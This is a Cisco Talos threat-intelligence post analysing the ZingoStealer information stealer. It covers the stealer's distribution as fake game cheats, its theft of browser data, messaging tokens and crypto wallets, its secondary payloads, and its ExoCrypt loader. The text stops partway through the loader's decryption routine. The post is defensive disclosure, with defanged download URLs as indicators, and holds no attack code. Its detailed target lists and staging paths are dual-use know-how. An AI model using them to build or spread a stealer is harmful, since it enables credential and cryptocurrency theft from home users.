@@ -1,0 +1,320 @@
+<div>
+<a name="4367814067552141200"></a>
+<h1 class="post-title entry-title">
+Threat Spotlight: "Haskers Gang" Introduces New ZingoStealer
+</h1>
+<a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgWWT_v-BfT0bhDfCFFaSQZ_pXjgpSpKbsK6gJHZLy3mAT0yxbCRxiJIhAvLp9jGKsrOEbNWs_FEO5-S2twu2HF6JI7696c-Xg2o5yS_1sR6Z1Bg2RQ00RJmuyzN6Lm5IjzP0pPIVJpksNJcivkDDxHTdIChFokIp3fLmsmjYaJ0DBPsmVHnLg2um6ibw/s1600/image12.png"><img alt="" border="0" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgWWT_v-BfT0bhDfCFFaSQZ_pXjgpSpKbsK6gJHZLy3mAT0yxbCRxiJIhAvLp9jGKsrOEbNWs_FEO5-S2twu2HF6JI7696c-Xg2o5yS_1sR6Z1Bg2RQ00RJmuyzN6Lm5IjzP0pPIVJpksNJcivkDDxHTdIChFokIp3fLmsmjYaJ0DBPsmVHnLg2um6ibw/s1600/image12.png" style="max-width:80%;height:auto;width:auto;"/></a><p>
+</p>Update (04/14/22): Following the initial publication of this blog, we observed a new post in the Haskers Gang Telegram channel announcing that ownership of the ZingoStealer project is being transferred to a new threat actor.<p><img height="120" src="https://lh3.googleusercontent.com/rTJNRzNHGB2DlbK6ILRx6blfWrlfIq6LV7FTPEifKhVeKX2dNa0WN7hTP7ui_PpGPxAmou-vW7JSVH1rUK6F9k2iHP_VZlyak5kRNZb_Iu9PT92Tu-yj1VKRsl8WibH_HUjx0IBK" width="624"/></p><p>We also observed the malware author offering to sell the source code for ZingoStealer for $500 (negotiable).</p><p><img height="151" src="https://lh5.googleusercontent.com/7VfGUvo48oIWc_6EaHnXO4B-TJGLTVmtZkxKEznmYTkN_bz6otcVoQgdStW2_zcvXgQBQ_M721g_PdB2ZPioCHjwQilS-ZkwR3QIcYPxGMaNy-YjXEtA4SHnlDXfeLZJLjIPzTQo" width="624"/></p><p></p><p>
+By <a href="https://twitter.com/b4n1shed">Edmund Brumaghin</a> and <a href="https://twitter.com/vanjasvajcer">Vanja Svajcer</a>, with contributions from Michael Chen.
+</p><ul>
+<li>
+Cisco Talos recently observed a new information stealer, called "ZingoStealer" that has been released for free by a threat actor known as "Haskers Gang."</li>
+<li>
+This information stealer, first introduced to the wild in March 2022, is currently undergoing active development and multiple releases of new versions have been observed recently.</li>
+<li>
+The malware leverages Telegram chat features to facilitate malware executable build delivery and data exfiltration.</li>
+<li>
+The malware can exfiltrate sensitive information such as credentials, steal cryptocurrency wallet information, and mine cryptocurrency on victims' systems.</li>
+<li>
+While this stealer is freely available and can be used by multiple threat actors, we have observed a focus on infecting Russian speaking victims under the guise of game cheats, key generators and pirated software, which likely indicates a current focus on home users.</li>
+<li>
+The threat actor "Haskers Gang" uses collaborative platforms such as Telegram and Discord to distribute updates, share tooling and otherwise coordinate activities.</li>
+<li>
+In many cases, ZingoStealer also delivers additional malware such as RedLine Stealer and the XMRig cryptocurrency mining malware to victims. </li>
+</ul>
+<a name="more"></a>
+<h2 id="h.sa1s29y77wtr"> </h2><h2 id="h.sa1s29y77wtr">What is "Haskers Gang?"</h2>
+Haskers Gang is a crimeware-related threat actor group active since at least January 2020, consisting of a small number of original members. Their activity ranges from developing methods for stealing confidential information to cryptocurrency mining, remote access and development of so-called "crypters" to avoid detection of malware by security and antivirus software. 
+The group operates a Telegram channel to collaborate with other members, collect logs from systems infected with ZingoStealer and publish announcements related to ongoing development efforts. The group also operates a similar collaborative Discord server where new tooling is often shared to enable members to launch more successful intrusions, improve antivirus evasion capabilities and otherwise disseminate tactics, techniques and procedures.
+These communities consist of thousands of members and demonstrate that financially motivated cybercrime is increasingly attractive to many people around the world. The core members of this crimeware group are likely located in Eastern Europe, and many of the announcements and other communications are written in Russian. 
+<h2 id="h.mvlaumyk4tvs">Introduction to ZingoStealer </h2>
+In early March 2022, while monitoring the communications between members of Haskers Gang, we observed the announcement of the availability of a new information stealer called "ZingoStealer." This new malware was advertised as being freely available to members of the Haskers Gang Telegram community.
+<a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgwAKYD8X9fFuNz2s2BJjirMuTduCdzzqvBbec6gQYPT1Ta-QaJqiAmsmbu8hBAJjC3hSAOO2xxWgOKjG_f9W6LPPh1b-wEnqKCVE4zVtZXo-g_GLnhTAmpfftV7KY5J9OESzKbQ2XxHezbwQxlsQiZ_ZH9MQYhj1wwlbE5pIgeI_wjUbXOey4UEd7A7A/s1600/image8.png"><img alt="" border="0" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgwAKYD8X9fFuNz2s2BJjirMuTduCdzzqvBbec6gQYPT1Ta-QaJqiAmsmbu8hBAJjC3hSAOO2xxWgOKjG_f9W6LPPh1b-wEnqKCVE4zVtZXo-g_GLnhTAmpfftV7KY5J9OESzKbQ2XxHezbwQxlsQiZ_ZH9MQYhj1wwlbE5pIgeI_wjUbXOey4UEd7A7A/s1600/image8.png" style="max-width:80%;height:auto;width:auto;"/></a>
+ZingoStealer release announcement.
+Since this announcement, we have observed a steady volume of ZingoStealer samples being uploaded to various malware repositories. 
+The malware is offered in two "tiers" of options, with both versions of the malware precompiled and delivered via a Telegram channel.
+<a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh5Nf9BMU87-2zTqWA2SgMpKx-h1fEWOLCiT7pBBltYQdKUPaxdhkS5PhG8_WF3TSS_jwnqdv0kxPAR-cfrhqBwyz0EFzK59quI6FJ_7bQdRQxGoLop-h_w9_mIv91JDOpBg9NChGZH64s8jbfP4-5iFibfaT_Eit4i-Jw1LMhnSqp8pY-tnF_VAh6DmQ/s1600/image22.png"><img alt="" border="0" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh5Nf9BMU87-2zTqWA2SgMpKx-h1fEWOLCiT7pBBltYQdKUPaxdhkS5PhG8_WF3TSS_jwnqdv0kxPAR-cfrhqBwyz0EFzK59quI6FJ_7bQdRQxGoLop-h_w9_mIv91JDOpBg9NChGZH64s8jbfP4-5iFibfaT_Eit4i-Jw1LMhnSqp8pY-tnF_VAh6DmQ/s1600/image22.png" style="max-width:80%;height:auto;width:auto;"/></a>
+ZingoStealer and exoCrypt crypter integration.
+For 300 Rubles (~$3 USD), Haskers Gang also offers a pre-built option that leverages their crypter, which they refer to as "ExoCrypt." This allows affiliates to take advantage of antivirus evasion without requiring them to use a third-party builder to package the malware prior to distributing it.
+During our analysis of ZingoStealer, we observed the malware author behind the stealer incorporating the XMRig cryptocurrency mining software into the stealer to further monetize their efforts by using systems infected by affiliates to generate Monero for the malware author. 
+<a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiBbFr26INLjaabtDKYerJdGBJ9wzGS_X52ukdLFpYVDI8OgD_9TPE-UNwUKe3S5x8EjroBXyVVpGF_ZeLcxAcbobuNhX8QDO4QQVdOOKCu45-d6MIOR8gJxqxROK8FR-yuRW1sH9RfiOTpLU42Qz_P6jVm_fITvMN0V8WyTlCLgSsPTT7F_nf-E3FNiw/s1600/image4.png"><img alt="" border="0" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiBbFr26INLjaabtDKYerJdGBJ9wzGS_X52ukdLFpYVDI8OgD_9TPE-UNwUKe3S5x8EjroBXyVVpGF_ZeLcxAcbobuNhX8QDO4QQVdOOKCu45-d6MIOR8gJxqxROK8FR-yuRW1sH9RfiOTpLU42Qz_P6jVm_fITvMN0V8WyTlCLgSsPTT7F_nf-E3FNiw/s1600/image4.png" style="max-width:80%;height:auto;width:auto;"/></a>
+Miner release announcement sent to the channel on March 18.
+While researching ZingoStealer, we observed additional functionality, cryptocurrency theft support, and other features added frequently, indicating that this threat will likely continue to evolve and mature over time.
+<h3 id="h.mcz1l8l710cg">Distribution campaigns</h3>
+As this stealer is being made available for free to members of the Haskers Gang community, it is likely being leveraged by a variety of otherwise unrelated threat actors using various techniques to infect potential victims. We have observed a steady volume of new samples in the wild and expect that this trend will continue. In many cases, ZingoStealer is currently being distributed under the guise of game cheats, cracks and code generators. 
+In one example, the malware was being distributed under the guise of a game modification utility for "Counter-Strike: Global Offensive." The threat actor posted a YouTube video demonstrating use of a tool purported to mod the popular video game. The video description contained a link to the tool hosted on Google Drive.
+<a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh_1YzVyEfsUXdvtPdaZ1SzHXrNVIdAzPj5nHbDni0d2vDZWEaBz21LCYoKc5185EVpA3yFDYPlytONX4j12S9iH6bHsr6jkVAUMJ_AqhbrrcBnmR_xQeNkgLV_1iPc7HPebVWc46ieap8Wfb135yOT99ZnS5jGfd_hxXCYXWlK-U-IC3hHe1Fr-m67mQ/s1600/image13.png"><img alt="" border="0" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh_1YzVyEfsUXdvtPdaZ1SzHXrNVIdAzPj5nHbDni0d2vDZWEaBz21LCYoKc5185EVpA3yFDYPlytONX4j12S9iH6bHsr6jkVAUMJ_AqhbrrcBnmR_xQeNkgLV_1iPc7HPebVWc46ieap8Wfb135yOT99ZnS5jGfd_hxXCYXWlK-U-IC3hHe1Fr-m67mQ/s1600/image13.png" style="max-width:80%;height:auto;width:auto;"/></a>
+YouTube video description. 
+The hyperlink points to a password-protected RAR archive stored in Google Drive that contains an executable called "loader.exe." This executable is responsible for infecting the system with ZingoStealer.
+<a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhUqDqNSpFnDHlUn9DPprEfP8YivD3v3K3jNPKZe0ugT4n_wU1zU03rDuc7TJEtBVi38ddvKuAbf8gRM54nBkS6xdFE6QAw1D8qOFOvyIam59bTYi0mHPoALdktLQnGHF-2ktlCycSHHa8qFCrz8O3ST6krSp6SPDjfaU_ifOVnKH0rIUo6WS5OLfGsEg/s1600/image2.png"><img alt="" border="0" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhUqDqNSpFnDHlUn9DPprEfP8YivD3v3K3jNPKZe0ugT4n_wU1zU03rDuc7TJEtBVi38ddvKuAbf8gRM54nBkS6xdFE6QAw1D8qOFOvyIam59bTYi0mHPoALdktLQnGHF-2ktlCycSHHa8qFCrz8O3ST6krSp6SPDjfaU_ifOVnKH0rIUo6WS5OLfGsEg/s1600/image2.png" style="max-width:80%;height:auto;width:auto;"/></a>
+Google Drive content.
+The video itself was posted well before the initial announcement of the availability of ZingoStealer, however, the modified date for the content hosted on Google Drive was March 22, 2022. This indicates that the hyperlinks in the video descriptions may be updated over time at the attacker's discretion.
+In many cases, the ZingoStealer executable was observed being hosted on the Discord CDN, following naming conventions similar to the following examples:
+hXXps://cdn[.]discordapp[.]com/attachments/960542241498210334/960544850158166027/2_5357301132811048430.exe
+hxxps://cdn[.]discordapp[.]com/attachments/960542241498210334/960542756156100708/2_5357488762752341390.exe
+hxxps://cdn[.]discordapp[.]com/attachments/941227101351215104/960556192931938304/loader_cheat_for_roblox.exe
+hxxps://cdn[.]discordapp[.]com/attachments/810482847340429352/960156304029151302/Ginzo.exe
+This may indicate threat actors are also distributing the malware within gaming-related Discord servers under the guise of video game cheats.
+<h3 id="h.63hkdqw4wfjx">Other Haskers Gang campaigns</h3>
+In another example, we observed a threat actor posting a YouTube video purporting to be a way to obtain free plugins for Adobe applications.
+<a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEis7QJHcCmKK3DrZK288X9TAUQDDdnvt8aQABZlm4mUJK-FxlYxK5WYzVQyeeXCzuG0qnm72LwVakY1nEBh-LWLf48Epc_kw1DNgupo-hbkKFMifPqsidHUGra93zozGk2uY72WVJMNIi2YDEnIYxQ7bgsriVsUKtsPIMjNiYAAsKxw9RfYrFqZk4n6gg/s1600/image7.png"><img alt="" border="0" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEis7QJHcCmKK3DrZK288X9TAUQDDdnvt8aQABZlm4mUJK-FxlYxK5WYzVQyeeXCzuG0qnm72LwVakY1nEBh-LWLf48Epc_kw1DNgupo-hbkKFMifPqsidHUGra93zozGk2uY72WVJMNIi2YDEnIYxQ7bgsriVsUKtsPIMjNiYAAsKxw9RfYrFqZk4n6gg/s1600/image7.png" style="max-width:80%;height:auto;width:auto;"/></a>
+Haskers Gang video announcement.
+The video description contained a link to a supposed tool which used the Bitly URL-shortening service. When clicked, the victim is redirected to a password-protected ZIP archive containing a malicious Windows executable hosted on the Mega[.]nz file-sharing website. The executable is packed and drops the RedLine information stealer on victims' systems. 
+The threat actor behind this distribution campaign also invited members of the Haskers Gang Telegram channel to post positive comments in English to add legitimacy to the video and associated hyperlinks. 
+This is a secondary payload we've frequently observed coinciding with ZingoStealer infections. In many cases, ZingoStealer retrieves a list of URLs hosted on the C2 server as "ginzolist.txt." The malware then attempts to retrieve the payloads hosted at these URLs, one of the most common being RedLine. We've also frequently observed XMRig being delivered to systems infected with ZingoStealer.
+<h2 id="h.vs6xz2p155r2">ZingoStealer execution</h2>
+The stealer is an obfuscated .NET executable. When executed on victim systems, it attempts to retrieve various .NET dependencies that provide core functionality used by the malware from an attacker-controlled server.
+The dependencies retrieved by the malware include:
+<ul>
+<li>
+BouncyCastle.Crypto</li>
+<li>
+DotNetZip</li>
+<li>
+NewtonSoft.Json </li>
+<li>
+SQLite.Interop (For both x86 and x64)</li>
+<li>
+System.Data.SQLite</li></ul><ul>
+</ul>
+<a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjpvNEZzcUMBjELlAAKVI7hab6P1wMxbDVdy5ec4LsQl6UFOLDV28fpBIvvwTmMOYSS9EhGo69LEM9_V26Q8R_MzmE_aVonmFoUXDwbjt_nh6nVdHrL3EVe9KfCduQ6c1BJH2tkijM9kdb4C961GGq8B3UIpMDZGVkpZSrRlhoBtw6q7djKuC8ohTCmBw/s1600/image3.png"><img alt="" border="0" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjpvNEZzcUMBjELlAAKVI7hab6P1wMxbDVdy5ec4LsQl6UFOLDV28fpBIvvwTmMOYSS9EhGo69LEM9_V26Q8R_MzmE_aVonmFoUXDwbjt_nh6nVdHrL3EVe9KfCduQ6c1BJH2tkijM9kdb4C961GGq8B3UIpMDZGVkpZSrRlhoBtw6q7djKuC8ohTCmBw/s1600/image3.png" style="max-width:80%;height:auto;width:auto;"/></a>
+.NET component retrieval.
+The retrieved DLL files are then stored in the directory from which the malware is currently running. In the case of SQLite.Interop.dll, the malware retrieves the x86 and x64 versions and creates a subdirectory for each architecture before storing the retrieved binaries.
+<a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgxLfQt17Kqp2n-C4GhI2_hndkXJtCmm9FuEu-83X_HLOlRsLgj5b60py_tDptbahG20hbUXqumY4DL1LxiGBbNGsJUMHtQYOHZdUWUZKGUzlgB9Tfx4dZDbSnkzmYGQEjS-evvLRqDCk7_DTcryiVQLzDPSZ_3EsO8DBlUPIoP0TAAdZbYGmr-dbSTxw/s1600/image19.png"><img alt="" border="0" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgxLfQt17Kqp2n-C4GhI2_hndkXJtCmm9FuEu-83X_HLOlRsLgj5b60py_tDptbahG20hbUXqumY4DL1LxiGBbNGsJUMHtQYOHZdUWUZKGUzlgB9Tfx4dZDbSnkzmYGQEjS-evvLRqDCk7_DTcryiVQLzDPSZ_3EsO8DBlUPIoP0TAAdZbYGmr-dbSTxw/s1600/image19.png" style="max-width:80%;height:auto;width:auto;"/></a>
+.NET component directory.
+The stealer then creates a directory structure which is used to collect and save sensitive information that is later exfiltrated to the attacker. The location for this directory structure is:
+C:\Users\&lt;USERNAME&gt;\AppData\Local\GinzoFolder
+Within this directory, the malware creates subfolders to store various types of information that is collected by the malware. These subdirectories include:
+<ul>
+<li>
+Browsers</li>
+<li>
+Wallets</li>
+<li>
+Desktop Files</li></ul><ul>
+</ul>
+ZingoStealer then begins the system enumeration and data collection process, starting by taking a screenshot of the victim's system and storing it as a PNG called "Screenshot.PNG" within the directory that was created earlier.
+Next the malware begins to identify and collect sensitive information stored by web browsers installed on the system. This includes saved local data, cookies, login data, etc. 
+It supports the major web browsers, including:
+<ul>
+<li>
+Google Chrome</li>
+<li>
+Mozilla Firefox</li>
+<li>
+Opera </li>
+<li>
+Opera GX</li></ul><ul>
+</ul>
+Discovered information is saved within the directory structure we described previously. 
+The malware also attempts to enumerate environmental and system information. This data is saved within a text file called "system.txt" which is also stored within the data staging directory and includes:
+<ul>
+<li>
+IP address</li>
+<li>
+Computer name</li>
+<li>
+Username</li>
+<li>
+OS version</li>
+<li>
+Localization information</li>
+<li>
+Processor information</li>
+<li>
+System memory</li>
+<li>
+Screen resolution</li>
+<li>
+Start time</li></ul><ul>
+</ul>
+Next, ZingoStealer attempts to collect sensitive information, including user account tokens for collaboration software that may be installed, including Discord and Telegram. As mentioned in our previous research related to <a href="https://blog.talosintelligence.com/2021/04/collab-app-abuse.html">abuse of collaboration platforms</a>, this information can be used to impersonate users, obtain victim account information, or otherwise abuse these platforms and their users. 
+ZingoStealer also attempts to access information related to Chrome extensions that may be present within the victim's web browser. This information is gathered from the following location:
+C:\Users\&lt;USERNAME&gt;\AppData\Local\Google\Chrome\User Data\Default\Local Extension Settings\&lt;CHROME_EXTENSION_ID&gt;
+The malware specifically searches for extension data associated with the following cryptocurrency wallet extensions.
+<ul>
+<li>
+TronLink</li>
+<li>
+Nifty Wallet</li>
+<li>
+MetaMask</li>
+<li>
+MathWallet</li>
+<li>
+Coinbase Wallet</li>
+<li>
+Binance Wallet</li>
+<li>
+Brave Wallet</li>
+<li>
+Guarda</li>
+<li>
+EQUAL Wallet</li>
+<li>
+BitApp Wallet</li>
+<li>
+iWallet</li>
+<li>
+Wombat - Gaming Wallet</li></ul><ul>
+</ul>
+ZingoStealer then searches %APPDATA%\Local and %APPDATA%\Roaming for cryptocurrency wallet data associated with the following cryptocurrencies.
+<ul>
+<li>
+Zcash</li>
+<li>
+Armory</li>
+<li>
+Bytecoin</li>
+<li>
+Jaxx Liberty</li>
+<li>
+Exodus</li>
+<li>
+Ethereum</li>
+<li>
+Electrum</li>
+<li>
+Atomic</li>
+<li>
+Guarda</li>
+<li>
+Coinomi</li></ul><ul>
+</ul>
+It also queries the registry (HKCU\SOFTWARE\&lt;VALUE&gt;) to identify settings associated with additional cryptocurrency wallets, including:
+<ul>
+<li>
+Bitcoin</li>
+<li>
+Dash</li>
+<li>
+Litecoin</li></ul><ul>
+</ul>
+Any files or directories present within the infected user's Desktop folder will also be copied to the staging directory. Any data successfully collected throughout this process will be stored in the appropriate subdirectory within the data staging directory. Once the collection process has been completed, DotNetZip creates an archive containing all the information, which is then exfiltrated to an attacker-controlled server.
+<a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjCUcJ2q8y1GJpg5LPqyJbQO3qM2a7yDCNbajxbpZ3e2Oq-WkPrHM3BxI5AOAaxbTvuVxJZ0gX9rgXy-4Ut-PjKlvMBFxdKTKa7DrcDdnGvlBesfB3NW4syQn8VqrYgHVQd_lLBJ7is60AwFFtaSxFiG5T98K2qbniU5PuRkrRYq7YYq8HL89iqe7opQQ/s1600/image6.png"><img alt="" border="0" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjCUcJ2q8y1GJpg5LPqyJbQO3qM2a7yDCNbajxbpZ3e2Oq-WkPrHM3BxI5AOAaxbTvuVxJZ0gX9rgXy-4Ut-PjKlvMBFxdKTKa7DrcDdnGvlBesfB3NW4syQn8VqrYgHVQd_lLBJ7is60AwFFtaSxFiG5T98K2qbniU5PuRkrRYq7YYq8HL89iqe7opQQ/s1600/image6.png" style="max-width:80%;height:auto;width:auto;"/></a>
+Data exfiltration.
+The logs are then processed and delivered to the Haskers Gang Telegram channel so ZingoStealer users can access them.
+<a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjklrhW72USR7tmoyzm6onjXPJEEd94RkMfX0Pb5VAQ0TI3ZjDp4iua4wM28oqGI45mR9YB-eCARfPs7XS45ulsP1Gqk9oyJSuEucSMjPRtS97dvesYA_DWapUX9DRpC5f8VZ0M7JVykz0AJwh5cUX0coKynwmyRUTTNw-O8jh-1PHie6GbqMyWcLJOZA/s1600/image11.png"><img alt="" border="0" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjklrhW72USR7tmoyzm6onjXPJEEd94RkMfX0Pb5VAQ0TI3ZjDp4iua4wM28oqGI45mR9YB-eCARfPs7XS45ulsP1Gqk9oyJSuEucSMjPRtS97dvesYA_DWapUX9DRpC5f8VZ0M7JVykz0AJwh5cUX0coKynwmyRUTTNw-O8jh-1PHie6GbqMyWcLJOZA/s1600/image11.png" style="max-width:80%;height:auto;width:auto;"/></a>
+Log delivery via Telegram.
+The malware is also used as a loader for other malware payloads. 
+During the execution of the ZingoStealer payload, it retrieves the geolocation of the victim's system using freegeoip[.]app. It then makes an HTTP GET request to the C2 server for a resource called "cis.txt." An example of this can be seen below.
+<a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjJCfV2rIXwczUr151V8AH3AlueJ_0fRz8-s8TDhL1eyFFk-0ZgD_cmT_XXD-uW8xUjGUWqybJ6G9luYR5zKyQyH4kx85nCx5ZlThHtZSJ94lIK0UFqsKt_jtexhAZcFpWZQLuHNFlyp_JUcx_SE3_tpVTc24zSAXrrD5XYKk15Kyd_6u1YUc2s_BxP2Q/s1600/image23.png"><img alt="" border="0" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjJCfV2rIXwczUr151V8AH3AlueJ_0fRz8-s8TDhL1eyFFk-0ZgD_cmT_XXD-uW8xUjGUWqybJ6G9luYR5zKyQyH4kx85nCx5ZlThHtZSJ94lIK0UFqsKt_jtexhAZcFpWZQLuHNFlyp_JUcx_SE3_tpVTc24zSAXrrD5XYKk15Kyd_6u1YUc2s_BxP2Q/s1600/image23.png" style="max-width:80%;height:auto;width:auto;"/></a>
+CIS check.
+This could be a reference to the Commonwealth of Independent States (CIS). Many financially motivated cybercriminals located in CIS countries actively avoid infecting systems in these countries to avoid attracting local law enforcement attention. Similar behavior is often observed, as ransomware operators often actively avoid targeting organizations located in these countries. In one of the initial announcements related to ZingoStealer, the malware author mentioned that, while CIS filtering is available, it is not currently in place, but it may be activated in the future based on local law enforcement attention.
+Following the geolocation check, the malware requests a list of URLs that it uses to retrieve and execute additional malware payloads, at the discretion of the attacker. 
+<a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj3LmwKGI1yw5iYPeSz-tQKD9A2fW-aVdhRSccosF0WtWzjLSMONXr_yNaZNNuM4m_NChRRZcwAUwQ4tTFgcs9W9l6xtFjbcIeIxapaxHVSJV7qUPT9UySWlBdJfdGHbyvmSVPYPYe_QN-EyASLYpwK7PvM6_dCtDscNrgYEJB7lcSbI-X7M6DfNuTXjw/s1600/image24.png"><img alt="" border="0" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj3LmwKGI1yw5iYPeSz-tQKD9A2fW-aVdhRSccosF0WtWzjLSMONXr_yNaZNNuM4m_NChRRZcwAUwQ4tTFgcs9W9l6xtFjbcIeIxapaxHVSJV7qUPT9UySWlBdJfdGHbyvmSVPYPYe_QN-EyASLYpwK7PvM6_dCtDscNrgYEJB7lcSbI-X7M6DfNuTXjw/s1600/image24.png" style="max-width:80%;height:auto;width:auto;"/></a>
+Secondary payload list retrieval.
+This list of URLs is saved into a text file called "ginzolist.txt" that is saved within the %APPDATA%\Local directory on the victim system. The malware then retrieves the additional malware payloads hosted at these URLs and saves them within the %APPDATA%\Local directory. An example of this can be seen below.
+<a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi40ac-oNQsqzwQGLKNgxt9b95vgFdVzi5uBxzz-4DYaYTHnh6L6I_FUsSEf-IQ_j9M_d921ISfxTa03-6TPYh8PjUKZDqMzkDp-IFK2oKox0DFrBcOw8b_5FT1MjunveoIy6fj7l8PpkAzLL1Zr0nPtxlMcQabzaIT9qsMLzK60rUr0TRHbZDIICSw_g/s1600/image16.png"><img alt="" border="0" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi40ac-oNQsqzwQGLKNgxt9b95vgFdVzi5uBxzz-4DYaYTHnh6L6I_FUsSEf-IQ_j9M_d921ISfxTa03-6TPYh8PjUKZDqMzkDp-IFK2oKox0DFrBcOw8b_5FT1MjunveoIy6fj7l8PpkAzLL1Zr0nPtxlMcQabzaIT9qsMLzK60rUr0TRHbZDIICSw_g/s1600/image16.png" style="max-width:80%;height:auto;width:auto;"/></a>
+Secondary payload binary retrieval.
+In this particular case, the binary "sweet.exe" was associated with RedLine Stealer and saved at C:\Users\&lt;USERNAME&gt;\AppData\Local\536075.exe.
+While "antiwm.exe" was associated with an injector for the XMRig cryptocurrency miner and saved at C:\Users\&lt;USERNAME&gt;\AppData\Local\209625.exe. 
+The retrieved binary payloads then continue the infection process. 
+<h2 id="h.6t12w41qoomx">ExoCrypt crypter</h2>
+As previously mentioned, the malware author responsible for ZingoStealer also offers a crypter service that allows ZingoStealer users to obtain encrypted ZingoStealer builds that assist with evading endpoint detection on systems. We identified a binary loader for ZingoStealer that may be related to the use of this crypter.
+<a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEieZJdrBZGcz9WJwrXCf-CGZ28unsMsyqGWBuXeb9QGQU2847_A_dpJ5GGCc8MBgc3k5f81APTuPSzkoOwOASNAKT7xAlzJqJYhPMELhKBOQr390o2UqhQHVq-W9IwZyvgBJr0PnjfWpb0BXE0TjNjV00PrV2J7_q9H5R3Vs3fvu6n0vmiqbFhsCh_X2g/s1600/image15.png"><img alt="" border="0" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEieZJdrBZGcz9WJwrXCf-CGZ28unsMsyqGWBuXeb9QGQU2847_A_dpJ5GGCc8MBgc3k5f81APTuPSzkoOwOASNAKT7xAlzJqJYhPMELhKBOQr390o2UqhQHVq-W9IwZyvgBJr0PnjfWpb0BXE0TjNjV00PrV2J7_q9H5R3Vs3fvu6n0vmiqbFhsCh_X2g/s1600/image15.png" style="max-width:80%;height:auto;width:auto;"/></a>
+Sample metadata.
+The functionality of the code is straightforward: It is responsible for implementing a randomized sleep interval before decrypting the contents of the ZingoStealer binary and saving the decrypted contents as %TEMP%\ChromeHandler.exe. It then executes the ZingoStealer binary, initiating the normal infection process previously described.
+<a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgwxx5OGINx-vPX7AYpQ6b472jOQkWbbP-toMjmB7GDjNcayWeBJNsQ9iy9du6ofeuhX8ZEGeJj0xrDTIOJycxktAkFHY77iNHO6sNwmsB9qyZvZmsulD09O0oatgc-1XoDd3Je7rYvSBO_1xk6VlhgyzPlgat07xCjrKiP_8FztM8EEtqifIFSKE41pQ/s1600/image10.png"><img alt="" border="0" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgwxx5OGINx-vPX7AYpQ6b472jOQkWbbP-toMjmB7GDjNcayWeBJNsQ9iy9du6ofeuhX8ZEGeJj0xrDTIOJycxktAkFHY77iNHO6sNwmsB9qyZvZmsulD09O0oatgc-1XoDd3Je7rYvSBO_1xk6VlhgyzPlgat07xCjrKiP_8FztM8EEtqifIFSKE41pQ/s1600/image10.png" style="max-width:80%;height:auto;width:auto;"/></a>
+Main() function.
+To decrypt the ZingoStealer binary, it retrieves the data from a resource present within the executable called "zvezdy" and stores it within an array. 
+<a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjFvLpgWgS2AsS0uFzFMzB6FKJFyYAkcdDgq2-1OTW1zWLezNPqdm2Nz6Ya4Ai9AH7MxYWdi0PY7_5oappzVWDCMOQqAcApNk7fduG6JbU168NrnjXALgH4MF-PYPRa_XdlzWzUfMGuL-Voj6JNJTuNTFNyt0ol940WHGCfXyxEB_MLBkkjOqgWNHm4NA/s1600/image5.png"><img alt="" border="0" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjFvLpgWgS2AsS0uFzFMzB6FKJFyYAkcdDgq2-1OTW1zWLezNPqdm2Nz6Ya4Ai9AH7MxYWdi0PY7_5oappzVWDCMOQqAcApNk7fduG6JbU168NrnjXALgH4MF-PYPRa_XdlzWzUfMGuL-Voj6JNJTuNTFNyt0ol940WHGCfXyxEB_MLBkkjOqgWNHm4NA/s1600/image5.png" style="max-width:80%;height:auto;width:auto;"/></a>
+Zvezdy resource contents.
+It then iterates through the array and performs a modulo operation on each of the values. Based on the results of the operation, each byte is converted into the appropriate value and stored within a second array. An example of the Decryption() function is shown below.
